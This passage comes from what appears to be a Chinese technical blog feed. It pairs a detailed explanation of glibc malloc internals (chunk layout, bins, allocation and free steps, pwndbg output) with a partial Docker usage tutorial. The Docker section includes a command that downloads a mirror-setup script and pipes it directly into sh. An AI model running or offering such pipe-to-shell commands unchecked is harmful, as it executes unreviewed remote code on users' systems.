<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* size field is or'ed with PREV_INUSE when previous adjacent chunk in use */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> PREV_INUSE 0x1</span></div><div class="line"><span class="comment">/* extract inuse bit of previous chunk */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> prev_inuse(p)       ((p)-&gt;size &amp; PREV_INUSE)</span></div><div class="line"></div><div class="line"><span class="comment">/* size field is or'ed with IS_MMAPPED if the chunk was obtained with mmap() */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IS_MMAPPED 0x2</span></div><div class="line"><span class="comment">/* check for mmap()'ed chunk */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_is_mmapped(p) ((p)-&gt;size &amp; IS_MMAPPED)</span></div><div class="line"></div><div class="line"><span class="comment">/* size field is or'ed with NON_MAIN_ARENA if the chunk was obtained</span></div><div class="line">   from a non-main arena.  This is only set immediately before handing</div><div class="line">   the chunk to the user, if necessary.  */</div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> NON_MAIN_ARENA 0x4</span></div><div class="line"><span class="comment">/* check for chunk from non-main arena */</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk_non_main_arena(p) ((p)-&gt;size &amp; NON_MAIN_ARENA)</span></div></pre></td></tr></table></figure>
<p><strong>fd：</strong> 在空闲 chunk 中指向相同 bin 里的后一个 chunk，在已分配的 chunk 中用于保存用户数据。<br><strong>bk：</strong> 在空闲 chunk 中指向相同 bin 里的前一个 chunk，在已分配的 chunk 中用于保存用户数据。</p>
<p><strong>a）Allocated chunk</strong><br>Allocated chunk 结构图如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</div><div class="line">            |             Size of previous chunk                            |</div><div class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</div><div class="line">            |             Size of chunk, in bytes                     |N|M|P|</div><div class="line">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</div><div class="line">            |             User data starts here...                          .</div><div class="line">            .                                                               .</div><div class="line">            .             (malloc_usable_space() bytes)                     .</div><div class="line">            .                                                               |</div><div class="line">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</div><div class="line">            |             Size of chunk                                     |</div><div class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</div></pre></td></tr></table></figure></p>
<p>chunk 指针指向一个 chunk 的开始，mem 指针为真正返回给用户的内存指针。</p>
<p>malloc chunk 的空间复用机制使得 Allocated chunk 会占用下一个 chunk 的 prev_size，这样能提高内存空间利用率。例如，用户使用 malloc(42) 申请 42 字节内存，那么最终分配的 allocated chunk 的 size 为 48。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">len = 42(用户请求) + 8(prev_size/size) - 4(复用next chunk prev_size) = 46</div><div class="line">size = Align(len, 8) = 48</div></pre></td></tr></table></figure></p>
<p><strong>b）Free chunk</strong><br>Free chunk 结构图如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</div><div class="line">            |             Size of previous chunk                            |</div><div class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</div><div class="line">    `head:&apos; |             Size of chunk, in bytes                         |P|</div><div class="line">      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</div><div class="line">            |             Forward pointer to next chunk in list             |</div><div class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</div><div class="line">            |             Back pointer to previous chunk in list            |</div><div class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</div><div class="line">            |             Unused space (may be 0 bytes long)                .</div><div class="line">            .                                                               .</div><div class="line">            .                                                               |</div><div class="line">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</div><div class="line">    `foot:&apos; |             Size of chunk, in bytes                           |</div><div class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</div></pre></td></tr></table></figure></p>
<p><strong>c）Top chunk</strong><br>堆内存是从低地址向高地址进行分配的，在堆内存的最高处，必然存在着一块空闲 chunk，叫做 top  chunk。当 bins 和 fast bins 中的 chunk 都不能满足分配需要的时候，malloc 会在 top chunk 中分出一块内存给用户。</p>
<p>不论 top chunk 有多大，它都不会被放到 fast  bins 或者是 bins 中。top  chunk 的大小是随着分配和回收不停变换的，如果从 top  chunk 分配内存会导致 top  chunk 减小，同时 top chunk 的指针增大；如果回收的 chunk 恰好与 top chunk 相邻，那么回收的 chunk 就会合并到 top chunk 中，从而使 top chunk 变大，top chunk 的指针减小。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">+---------------------+   &lt;--first chunk ptr</div><div class="line">|     prev_size       |</div><div class="line">+---------------------+</div><div class="line">|        size         |          </div><div class="line">+---------------------+   &lt;--first mem                  </div><div class="line">|                     |</div><div class="line">|     allocated       |         </div><div class="line">|      chunk          |      </div><div class="line">+---------------------+   &lt;--second chunk ptr                </div><div class="line">|      prev_size      |         </div><div class="line">+---------------------+                     </div><div class="line">|        size         |         </div><div class="line">+---------------------+   &lt;--second mem              </div><div class="line">|     Allocated       |         </div><div class="line">|       chunk         |     </div><div class="line">+---------------------+   &lt;-- top                  </div><div class="line">|     prev_size       |            </div><div class="line">+---------------------+                     </div><div class="line">|    size=0x205d1     |           </div><div class="line">+---------------------+                      </div><div class="line">|                     |</div><div class="line">|        TOP          |   </div><div class="line">|       CHUNK         |    </div><div class="line">|                     |</div><div class="line">+---------------------+</div></pre></td></tr></table></figure>
<p>例如，先申请两个大小为 89 的 chunk，然后释放第二个 chunk。释放后的 chunk 将会与 top chunk 合并，使得 top chunk 增大，同时 chunk 指针减小。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-10-24/1257914.jpg" alt=""></p>
<p><strong>d） Last Remainder chunk</strong><br>Last remainder 与 top chunk 一样，不会在任何 bins 中找到这种 chunk。当需要分配一个 small chunk，但在 small bins 中找不到合适的 chunk 时，如果 last remainder chunk 大于所需的 small chunk，last remainder chunk 被分成两个 chunk，其中一个 chunk 返回给用户，另一个 chunk 变成新的 last remainder chuk。</p>
<h4 id="3）Bin"><a href="#3）Bin" class="headerlink" title="3）Bin"></a><strong>3）Bin</strong></h4><p>用户 free 掉的内存并不会马上归还给系统，malloc 会统一管理 heap 和 mmap 映射区域中的空闲 chunk，当用户进行下一次分配请求时，malloc 会首先试图在空闲 chunk 中挑选一块给用户，这样就避免了频繁的系统调用，降低了内存分配的开销。</p>
<p>用于保存 free chunk 链表表头信息的指针数组称为 bin，按所悬挂链表的类型可以分为4类：Fast bin、Unsorted bin、Small bin、Large bin。保存 bin 的数据结构为 fastbinsY 和 bins 两个数组：fastbinsY 数组保存 fast bin，bins 数组保存 unsorted、small 和 large bin，总共有 126 个 bin：Bin 1 为 Unsorted bin、Bin 2 to Bin 63 为 Small bin、Bin 64 to Bin 126 为 Large bin。<br><img src="http://ooyovxue7.bkt.clouddn.com/17-10-24/55042966.jpg" alt=""></p>
<p><strong>Fast Bin</strong><br>fast chunk 的大小为16~64 bytes 的 chunk，保存 fast chunk 的 bin 被称为 fast bin，fast bin 在内存中分配和回收的速度最快。</p>
<p>小于64 bytes 的 chunk 被释放后，会被放到 fast bins 中。fast  bins 中的 chunk 并不改变它的使用标志 P，所以就无法进行合并。当需要分配的 chunk 小于或等于64 bytes 时，malloc 首先会在 fast  bins 中查找相应的空闲块，若没有找到合适的 chunk 再去查找 bins 中的空闲 chunk。fast bin 的有以下特点：</p>
<blockquote>
<p>a) bin 的数量：总共10 个，每个 fast bin 包含一个 free chunk 的单向链表，单项链表的增加和删除都在链表头（LIFO）。<br>b) Chunk size：不同 bin 中 chunk 大小以8字节递增，同一个 fast bin 的 chunk大小相同。例如，第一个 fast bin 的 chunk为16字节；第二个 fast bin 的 chunk 为24字节，以此类推。在 malloc 初始化阶段，fast bin 最大64字节，因此默认 16~64 字节的 chunk是 fast chunk。<br>c) 不合并：两个相邻的 free chunk 不会合并成，虽然会产生更多碎片，但是 free 的速度提高了。</p>
</blockquote>
<p>例如，申请3个大小为 0x30（size 为 0x41）的 chunk，然后将 2-1-3 的顺序将其释放，结果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; heap                                                                                                                              [5/1809]</div><div class="line">Top Chunk: 0x804c078</div><div class="line">Last Remainder: 0</div><div class="line"></div><div class="line">0x804c000 FASTBIN &#123;</div><div class="line">  prev_size = 0,</div><div class="line">  size = 41,</div><div class="line">  fd = 0x804c028,</div><div class="line">  ...</div><div class="line">&#125;</div><div class="line">0x804c028 FASTBIN &#123;</div><div class="line">  prev_size = 0,</div><div class="line">  size = 41,</div><div class="line">  fd = 0x0,</div><div class="line">  ...</div><div class="line">&#125;</div><div class="line">0x804c050 FASTBIN &#123;</div><div class="line">  prev_size = 0,</div><div class="line">  size = 41,</div><div class="line">  fd = 0x804c000,</div><div class="line">  ...</div><div class="line">&#125;</div><div class="line">0x804c078 PREV_INUSE &#123;</div><div class="line">  prev_size = 0,</div><div class="line">  size = 135049,</div><div class="line">  fd = 0x0,</div><div class="line">  ...</div><div class="line">&#125;</div><div class="line"></div><div class="line">pwndbg&gt; fastbins</div><div class="line">fastbins</div><div class="line">0x10: 0x0</div><div class="line">0x18: 0x0</div><div class="line">0x20: 0x0</div><div class="line">0x28: 0x804c050 —▸ 0x804c000 —▸ 0x804c028 ◂— 0x0</div><div class="line">0x30: 0x0</div><div class="line">0x38: 0x0</div><div class="line">0x40: 0x0</div></pre></td></tr></table></figure></p>
<p>从以上结果可看出，释放时将 chunk 添加到链表的表头，释放后的 fast chunk 的 P 标识位仍为 1，从而避免了空闲堆块的合并。</p>
<p><strong>Unsorted Bin</strong><br>当 small 或 large chunk 释放后，不会立即把它们加到对应的 bin，而是加到 unsorted bin 中。这样能使 malloc 重用最近释放的 chunk，减少查找合适 bin 的时间，使内存的分配和回收速度得到提高。</p>
<p>在进行 malloc 操作时，如果在 fast bins 中没有找到合适的 chunk，malloc 会先在 unsorted bin 中查找合适的空闲 chunk，然后才查找 bins。如果 unsorted bin 不能满足分配要求，malloc 便会将 unsorted bin 中的 chunk 加入对应的 bins 中。因此，unsorted bin 可以看做是 bins 的一个缓冲区，它能加快内存分配的速度。Unsorted Bin 的特点如下：</p>
<blockquote>
<p>a）bin 的数量：只有1个。<br>b）循环双向链表：unsorted bin 包含一个 free chunk 的循环双向链表。链表的增加在表头位置，找到合适大小的 chunk 即可删除。<br>c）Chunk size：没有大小限制。</p>
</blockquote>
<p><strong>Small Bin</strong><br>small chunk 小于512字节，保存 small chunk 的 bin 称为 small bin。small bin 的分配与回收比 large bin 快，但比 fast bin 慢。它有以下特点：</p>
<blockquote>
<p>a）bin 的数量：总共有62个 small bin。<br>b）循环双向链表：small bin 包含free chunk 的循环双向链表，双向链表的增加在表头，删除在末尾（FIFO）。<br>c）Chunk Size：不同 bin 中 chunk 大小以8字节递增。同一个 small bin 里的 chunk 大小相同。例如，第一个 small bin（Bin 2）chunk 的大小为16字节；第二个 smallbin（Bin 3）chunk 的大小为24字节，以此类推。<br>d）合并：两个相邻的 free chunk 会合并。合并可减少碎片，但会使 free 速度减慢。</p>
</blockquote>
<p><strong>Large Bin</strong><br>large chunk 的大小大于或等于 512，保存 large chunk 的 bin 称为 large bin。它有以下特点：</p>
<blockquote>
<p>a）bin 的数量：总共有63个 large bin。<br>b）循环双向链表：large bin 包含一个 free chunk 的循环双向链表，chunk 的增加和删除可以在链表的任何位置。<br>c）合并：两个相邻的 free chunk 会合并。</p>
</blockquote>
<p>当空闲的 chunk 被链接到 bin 中时，malloc 会把表示该 chunk 是否处于使用中的标志 P 设为 0（该标志在下一个 chunk 的 size中），同时 malloc 还会检查它前后的 chunk 是否也是空闲的，如果是的话，malloc 会首先把它们合并为一个大的 chunk，然后将合并后的 chunk 放到 unstored bin 中。</p>
<h3 id="0x02-内存分配"><a href="#0x02-内存分配" class="headerlink" title="0x02 内存分配"></a><strong>0x02 内存分配</strong></h3><h4 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a><strong>malloc</strong></h4><p>当使用 malloc 申请内存时，malloc 的具体过程如下：</p>
<p>1）获取一个未加锁的分配区，如果所有分配区都加了锁，ptmalloc 会开辟一个新的分配区。开辟新分配区时，会调用 mmap 创建一个 sub-heap，并设置好 top chunk。<br>2）将用户的请求大小转换为实际需要分配的 chunk 空间大小。<br>3）判断所需分配 chunk 的大小是否在 fast chunk 中。若是，则转下一步，否则跳到第 5 步。<br>4）首先尝试在 fast bins 中取一个所需大小的 chunk 分配给用户。如果可以找到，则分配结束，否则转到下一步。<br>5）判断所需大小是否处在 small  bins 中，若是，则转下一步，否则转到第 7 步。<br>6）根据所需分配的 chunk 的大小，找到对应的 small bin，从该 bin 的尾部摘取一个恰好满足大小的 chunk。若成功，则分配结束，否则，转到下一步。<br>7）首先将 fast bins 中的 chunk 合并，并且放入 unsorted bin 中。如果需要分配的 chunk 属于 small bins，unsorted bin 中只有一个 chunk，并且该 chunk 的大小大于等于需要分配的大小。此时将该 chunk 进行切割，分配结束。否则，将 unsorted bin 中的 chunk 放入 small bins 或者 large bins。进入下一步。<br>8）从 large bins 中按照 “smallest-first，best-fit” 原则找一个合适的 chunk，从中划分一块所需大小的 chunk，并将剩下的部分链接回到 bins 中。若操作成功，则分配结束，否则转到下一步。<br>9）判断 top chunk 大小能否满足所需 chunk 的大小，如果能，则从 top chunk 中分配内存。否则转到下一步。<br>10）判断所需分配的 chunk 大小是否大于等于 mmap 分配阈值，如果是，则转下一步，调用 mmap 分配，否则跳到第 12 步。<br>11）使用 mmap 系统调用为程序的内存空间映射一块 chunk_size align 4kB 大小的空间。<br>12）如果是主分配区，调用 sbrk()，增加 top chunk 大小；如果是非主分配区，调用 mmap 来分配一个新的 sub-heap，增加 top chunk 大小。    </p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h4><p><strong>1）小内存</strong><br> [获取分配区(arena)并加锁] -&gt; fast bins -&gt; small bins -&gt; 合并 fast bins 加入unsorted bins -&gt; unsorted bins -&gt; large bins -&gt; 增大 top chunk（低于 mmap 阈值） -&gt; mmap（高于 mmap 阈值）。</p>
<p><strong>2）大内存</strong><br>直接 mmap。</p>
<h3 id="0x03-内存回收"><a href="#0x03-内存回收" class="headerlink" title="0x03 内存回收"></a><strong>0x03 内存回收</strong></h3><h4 id="free"><a href="#free" class="headerlink" title="free"></a><strong>free</strong></h4><p>释放堆内存时根据 chunk 所处的位置和该 chunk 的大小采取不同的方法。free() 函数的具体步骤如下：</p>
<p>1）首先需要获取分配区的锁，保证线程安全。<br>2）判断传入的指针是否为 0，如果为 0，则直接 return。否则转下一步。<br>3）判断所需释放的 chunk 是否为 mmaped chunk，如果是，则调用 munmap() 释放，解除内存空间映射，该该空间不再有效。<br>4）判断 chunk 的大小和所处的位置，若为 fast chunk，则转到下一步，否则跳到第 6 步。<br>5）将 chunk 放到 fast bins 中，并且不修改该 chunk 使用状态位 P，也不与相邻的 chunk 进行合并。释放结束。<br>6）判断前一个 chunk 的使用状态，如果是空闲块，则合并。并转下一步。<br>7）判断当前释放 chunk 的下一个块是否为 top chunk，如果是，则转第 9 步，否则转下一步。<br>8）判断下一个 chunk 的使用状态，如果是空闲块，则合并，并将合并后的 chunk 放到 unsorted bin 中。并转到第 10 步。<br>9）释放的 chunk 与 top chunk 相邻，将它与 top chunk 合并，并更新 top chunk 的大小等信息。转下一步。<br>10）判断合并后的 chunk 的大小是否大于 FASTBIN_CONSOLIDATION_THRESHOLD（默认64KB），如果是，则会触发 fast bins 的合并操作，fast bins 中的 chunk 将被遍历，并与相邻的空闲 chunk 进行合并，合并后的 chunk 会被放到 unsorted bin 中。操作完成后转下一步。<br>11）判断 top chunk 的大小是否大于 mmap 收缩阈值（默认为 128KB），如果是，对于主分配区，则会归还 top chunk 中的一部分给操作系统。但是会保留最先分配的 128KB 的空间，用于响应用户的分配请求；如果为非主分配区，会进行 sub-heap 收缩，将 top chunk 的一部分返回给操作系统，如果 top chunk 为整个 sub-heap，会把整个 sub-heap 还回给操作系统。释放结束，从 free() 函数退出。    </p>
<h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a><strong>总结</strong></h4><p><strong>1）大内存</strong><br>直接 munmap。</p>
<p><strong>2）小内存</strong><br>fast chunk：放入 fast bin -&gt; top chunk 相邻：与 top chunk 合并 -&gt; small chunk、large chunk：与前后的 free chunk 合并后放到 unsorted bin中 -&gt; 如果合并后的 chunk 大于 64KB 则触发合并 fast bin 操作，合并fast bin放到 unsorted 中 -&gt; top chunk 大小达到 mmap 收缩阈值，则将部分 top chunk 的内存归还给系统。</p>
<hr>
<p>References:<br>[1] glibc内存管理ptmalloc源代码分析<br>[2] <a href="http://pwn4.fun/2016/04/11/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3glibc-malloc/" target="_blank" rel="external">深入理解glibc malloc</a><br>[3] <a href="http://blog.csdn.net/maokelong95/article/details/52006379" target="_blank" rel="external">glibc内存分配与回收过程图解</a><br>[4] <a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/?spm=a313e.7916648.0.0.123608f8erhuwJ" target="_blank" rel="external">Understanding glibc malloc</a></p>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 内存管理 </tag>
            
            <tag> malloc </tag>
            
            <tag> 堆 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Docker 使用笔记]]></title>
      <url>/Docker%20%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<p>Docker是一个开源项目，诞生于 2013 年初，最初是 dotCloud 公司内部的一个业务项目。它基于 Google 公司推出的 Go 语言实现。项目后来加入 Linux 基金会，遵从了 Apache 2.0 协议，项目代码在 GitHub 上进行维护。</p>
<p>Docker 项目的目标是实现轻量级的操作系统虚拟化解决方案，Docker 的基础是 Linux 容器 (LXC) 等技术。在 LCX 的基础上 Docker 进行了进一步的封装，让用户不需要关心容器的管理，使得操作更为简便，用户操作 Docker 的容器就像操作一个快速轻量级的虚拟机一样。</p>
<p>以下为 Docker 的基本功能使用记录。</p>
<h3 id="0x01-安装-Docker"><a href="#0x01-安装-Docker" class="headerlink" title="0x01 安装 Docker"></a><strong>0x01 安装 Docker</strong></h3><h4 id="1）安装"><a href="#1）安装" class="headerlink" title="1）安装"></a><strong>1）安装</strong></h4><p>在测试或开发环境中 Docker 官方为了简化安装流程，提供了一套便捷的安装脚本，Ubuntu 系统上可以使用这套脚本安装：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ curl -fsSL get.docker.com -o get-docker.sh</div><div class="line">$ sudo sh get-docker.sh --mirror Aliyun</div></pre></td></tr></table></figure></p>
<h4 id="2）镜像加速器"><a href="#2）镜像加速器" class="headerlink" title="2）镜像加速器"></a><strong>2）镜像加速器</strong></h4><p>国内访问 Docker Hub 有时会遇到困难，此时可以配置镜像加速器。使用国内云服务商 DaoCloud 提供的加速器服务。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://xxx.m.daocloud.io</div></pre></td></tr></table></figure></p>
<p>该脚本可以将 –registry-mirror 加入到 Docker 配置文件 /etc/docker/daemon.json 中。适用于 Ubuntu14.04、Debian、CentOS6 、CentOS7、Fedora、Arch Linux、openSUSE Leap 42.1，其他版本可能有细微不同。    </p>
<p>重新启动服务。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo service docker restart</div></pre></td></tr></table></figure></p>
<p>配置完加速器需要检查是否生效，如果 Docker 版本大于 1.13 或 17.05.0-ce，可以使用以下命令检查。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker info|grep <span class="string">"Registry Mirrors"</span> -A <span class="number">1</span></div><div class="line">Registry Mirrors:</div><div class="line"> http://xxx.m.daocloud.io/</div><div class="line">WARNING: No swap limit support</div></pre></td></tr></table></figure></p>
<h3 id="0x02-镜像"><a href="#0x02-镜像" class="headerlink" title="0x02 镜像"></a><strong>0x02 镜像</strong></h3><p>对于 Linux 而言，内核启动后，会挂载 root 文件系统为其提供用户空间支持。而 Docker 镜像（Image），就相当于是一个 root 文件系统。比如官方镜像 ubuntu:14.04 就包含了完整的一套 Ubuntu 14.04 最小系统的 root 文件系统。</p>
<p>Docker 镜像是一个特殊的文件系统，除了提供容器运行时所需的程序、库、资源、配置等文件外，还包含了一些为运行时准备的一些配置参数（如匿名卷、环境变量、用户等）。镜像不包含任何动态数据，其内容在构建之后也不会被改变。</p>
<h4 id="1）获取镜像"><a href="#1）获取镜像" class="headerlink" title="1）获取镜像"></a><strong>1）获取镜像</strong></h4><p>从 Docker Registry 获取镜像的命令是 docker pull。其命令格式为：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">docker pull [选项] [Docker Registry地址]&lt;仓库名&gt;:&lt;标签&gt;</div></pre></td></tr></table></figure></p>
<p>Docker Registry地址：地址的格式一般是 &lt;域名/IP&gt;[:端口号]。默认地址是 Docker Hub。<br>仓库名：仓库名是两段式名称，即 &lt;用户名&gt;/&lt;软件名&gt;。对于 Docker Hub，如果不给出用户名，则默认为 library，也就是官方镜像。如：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker pull ubuntu:<span class="number">14.04</span>                                                                                                        </div><div class="line"><span class="number">14.04</span>: Pulling <span class="keyword">from</span> library/ubuntu</div><div class="line">bae382666908: Pull complete</div><div class="line"><span class="number">29</span>ede3c02ff2: Pull complete</div><div class="line">da4e69f33106: Pull complete</div><div class="line"><span class="number">8</span>d43e5f5d27f: Pull complete</div><div class="line">b0de1abb17d6: Pull complete</div><div class="line">Digest: sha256:<span class="number">6e3</span>e3f3c5c36a91ba17ea002f63e5607ed6a8c8e5fbbddb31ad3e15638b51ebc</div><div class="line">Status: Downloaded newer image <span class="keyword">for</span> ubuntu:<span class="number">14.04</span></div></pre></td></tr></table></figure></p>
<p>上面的命令中没有给出 Docker Registry 地址，而镜像名称是 ubuntu:14.04，因此将会获取官方镜像 library/ubuntu 仓库中标签为 14.04 的镜像。</p>
<h4 id="2）运行容器"><a href="#2）运行容器" class="headerlink" title="2）运行容器"></a><strong>2）运行容器</strong></h4><p>使用<code>docker run</code> 根据镜像新建并运行容器。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker run -it ubuntu:<span class="number">14.04</span> bash                                                                                                </div><div class="line">root@fd93decf46b8:/<span class="comment"># cat /etc/os-release</span></div><div class="line">NAME=<span class="string">"Ubuntu"</span></div><div class="line">VERSION=<span class="string">"14.04.5 LTS, Trusty Tahr"</span></div><div class="line">ID=ubuntu</div><div class="line">ID_LIKE=debian</div><div class="line">PRETTY_NAME=<span class="string">"Ubuntu 14.04.5 LTS"</span></div><div class="line">VERSION_ID=<span class="string">"14.04"</span></div><div class="line">HOME_URL=<span class="string">"http://www.ubuntu.com/"</span></div><div class="line">SUPPORT_URL=<span class="string">"http://help.ubuntu.com/"</span></div><div class="line">BUG_REPORT_URL=<span class="string">"http://bugs.launchpad.net/ubuntu/"</span></div><div class="line">root@fd93decf46b8:/<span class="comment">#</span></div></pre></td></tr></table></figure></p>
<blockquote>
<p>-it：这是两个参数，-i 是交互式操作，-t 为交互式终端。<br>ubuntu:14.04：指用 ubuntu:14.04 镜像为基础来启动容器。<br>bash：放在镜像名后的是命令，运行bash 返回交互式 Shell。</p>
</blockquote>
<p>进入容器后，可以在 Shell 下操作，执行任何所需的命令。最后可以通过 exit 退出容器。</p>
<p>退出容器后可以使用 <code>docker exec</code> 命令进入容器。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker ps -a</div><div class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</div><div class="line">fd93decf46b8        ubuntu:<span class="number">14.04</span>        <span class="string">"bash"</span>              <span class="number">3</span> hours ago         Up About an hour                        practical_raman</div><div class="line">lc@ubuntu:~$ sudo docker <span class="keyword">exec</span> -it fd93decf46b8 bash</div><div class="line">root@fd93decf46b8:/<span class="comment">#</span></div></pre></td></tr></table></figure></p>
<h4 id="3）列出镜像"><a href="#3）列出镜像" class="headerlink" title="3）列出镜像"></a><strong>3）列出镜像</strong></h4><p>使用<code>docker images</code> 命令可以列出已经下载的镜像。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker images</div><div class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</div><div class="line">ubuntu              <span class="number">14.04</span>               dea1945146b9        <span class="number">2</span> weeks ago         <span class="number">188</span>MB</div></pre></td></tr></table></figure></p>
<p>列表包含了仓库名、标签、镜像 ID、创建时间以及所占用的空间。</p>
<h4 id="4）保存镜像"><a href="#4）保存镜像" class="headerlink" title="4）保存镜像"></a><strong>4）保存镜像</strong></h4><p>当修改容器的文件后，可以使用命令<code>docker diff</code>查看具体的改动。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">lc@ubuntu:~$ sudo docker diff fd93decf46b8</div><div class="line">C /root</div><div class="line">A /root/.bash_history</div></pre></td></tr></table></figure></p>
